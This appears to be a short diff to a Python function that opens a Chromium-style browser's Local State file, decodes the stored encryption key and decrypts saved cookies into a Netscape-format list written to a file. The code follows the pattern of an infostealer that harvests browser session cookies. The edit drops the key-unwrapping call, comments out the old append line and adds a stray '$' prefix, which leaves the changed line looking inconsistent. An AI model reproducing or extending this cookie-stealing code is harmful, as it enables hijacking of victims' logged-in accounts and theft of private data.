@@ -536,7 +536,6 @@ def getCookie(path, arg):
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]
-    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
     for row in data: 
         if row[0] != '':
@@ -547,7 +546,8 @@ def getCookie(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
-            Cookies.append(f"{row[0]}   TRUE    /   FALSE   2597573456  {row[1]}    {DecryptValue(row[2], master_key)}")
+            Cookies.append(f"${row[0]}  TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2])}")
+            # Cookies.append(f"{row[0]}   TRUE    /   FALSE   2597573456  {row[1]}    {DecryptValue(row[2], master_key)}")
             CookiCount += 1
     writeforfile(Cookies, 'cook')
     
